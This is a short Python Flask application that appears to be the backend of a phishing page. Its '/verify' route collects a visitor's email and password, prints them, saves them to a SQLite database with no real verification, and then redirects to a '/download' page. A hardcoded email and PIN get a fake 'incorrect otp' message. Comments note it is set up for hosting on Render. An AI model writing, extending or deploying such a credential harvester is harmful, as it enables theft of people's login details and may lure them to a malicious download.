from flask import Flask, render_template, request, redirect
import sqlite3

app = Flask(__name__)

@app.route('/')  # ✅ NEW homepage route
def index():
    return redirect('/verify')  # You can change this to render a welcome page instead

@app.route('/verify', methods=["POST", "GET"])
def veri():
    if request.method == "POST":
        email = request.form["email"]
        pin = request.form["password"]
        print(f"email : {email} \n pin : {pin}")

        if pin == "123ab90" or email == "eyakalunxfgxhg8@gmail.com":
            return '<script>alert("incorrect otp");window.history.back();</script>'

        db = sqlite3.connect("database.db")
        c = db.cursor()
        c.execute("INSERT INTO se (email, pin) VALUES (?, ?)", (email, pin))  # ✅ Safer SQL with parameter substitution
        db.commit()
        db.close()

        return redirect('/download')
    
    return render_template("veri.html")

@app.route('/download')
def dor():
    return render_template("down.html")

# Remove app.run — Render uses gunicorn
# if __name__ == "__main__":
#     app.run(host="0.0.0.0", port=8080)

